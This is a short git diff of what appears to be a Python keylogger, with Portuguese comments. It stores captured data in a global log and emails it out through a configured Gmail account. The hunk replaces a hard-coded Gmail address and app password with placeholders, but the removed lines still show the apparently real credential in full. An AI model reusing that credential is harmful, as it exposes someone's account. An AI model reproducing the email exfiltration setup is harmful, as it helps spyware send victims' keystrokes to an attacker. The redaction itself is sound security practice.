@@ -73,9 +73,9 @@ from threading import Timer
 log = "" # Variavel global para armazenar os dados capturados
 
 # CONFIGURAÇOES DE EMAIL
-EMAIL_ORIGEM = "cybersecjungle@gmail.com"
-SENHA_EMAIL = "jiht tbxj mqkt ppaj"
-EMAIL_DESTINO = "cybersecjungle@gmail.com"
+EMAIL_ORIGEM = "XXXXX@gmail.com"
+SENHA_EMAIL = "XXXX XXXX XXXX XXXX"
+EMAIL_DESTINO = "XXXXX@gmail.com"
 
 def enviar_email():
     global log
